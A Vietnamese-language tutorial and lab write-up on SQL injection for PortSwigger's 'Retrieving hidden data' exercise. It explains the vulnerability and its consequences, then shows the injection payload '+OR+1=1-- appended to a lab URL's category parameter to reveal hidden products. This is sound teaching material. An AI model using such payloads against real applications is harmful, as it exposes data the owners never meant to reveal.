# SQL Injection
Hello mấy ní hôm nay cùng tìm hiểu SQL injection trên Portswigger nhé =)))). 
## SQL là gì?
Sql injection là một lỗ hổng bảo mật web ( web security vulnerability ) cho phép các hacker can thiệp vào các truy vấn mà application tạo ra để gửi đến các database của nó.
![image](https://github.com/user-attachments/assets/73811511-6f78-42c0-847d-3549dceaf451)  

**Question: Vây các hacker có thể khai thác được gì từ SQLI?**
* Các hacker có thể xem những thông tin mà thông thường chúng ta không thể thấy được.
* Kẻ tấn công còn có thể thông qua đó mà chỉnh sửa và xóa đi các thông tin quan trọng trong database. 
* Kẻ tấn công có thể thông qua SQLI để leo thang các của tấn công của họ đến các máy chủ hay cơ sở hạng tầng khác.   
## Hậu quả các cuộc tấn công bằng SQL injection ?
Hậu quả của việc bị xâm phạm vào các thông tin nhạy cảm có thể là hậu quả của 1 cuộc tấn công bằng SQL Injection, trong đó các thông tin thường bị lộ là:
* Thông tin về tài chính như thẻ ngân hàng, thẻ ghi nợ.
* Thông tin cá nhân.
* Thông tin về tài khoản mật khẩu quan trọng như ví điện tử, mxh,...
## LAB1: [Retrieving hidden data](https://https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-retrieving-hidden-data/sql-injection/lab-retrieve-hidden-data). 

![image](https://github.com/user-attachments/assets/737429d1-bdf7-4988-bad3-8e5467b9169d)

Dựa theo yêu cầu đề bài chúng ta phải làm xuất hiện các sản phẩm chưa được công bố trong trang web. 
Câu lệnh truy vấn SQL là:
``` 
SELECT * FROM products WHERE category = 'Gifts' AND released =1 
```
Giải nghĩa: trả về thông tin sản phẩm khi 'category' là gifts và ```released = 1 ``` -> nó chỉ hiện ra các sản phẩm thuộc gifts và đã được công bố.
Để khai thác ta có thể thêm vào URL của trang web từ 
```
https://0afe00b6047c270583e3fe7c00050033.web-security-academy.net/filter?category=Accessories
```
![image](https://hackmd.io/_uploads/BJAG3wE2yg.png)

bằng cách thêm vào '+OR+1=1--
```
https://0afe00b6047c270583e3fe7c00050033.web-security-academy.net/filter?category=Accessories'+OR+1=1--
```
![image](https://github.com/user-attachments/assets/784d1e02-b6a1-450b-ba39-da563dcdc297)  
Như ta thấy nó đã hiện ra các sản phẩm bị giấu đi. 
Giả sử như truy vấn ban đầu là: 
```linux
SELECT * FROM products WHERE category = 'Accessories';
```
sau khi chèn pay load vào thì nó trở thành:
```linux
SELECT * FROM products WHERE category = 'Accessories' OR 1=1--';
```
* OR 1=1: Luôn đúng → Kết quả trả về tất cả sản phẩm thay vì chỉ "Accessories".  
* --: Đây là dấu comment trong SQL, giúp bỏ qua phần còn lại của truy vấn, tránh lỗi cú pháp.  

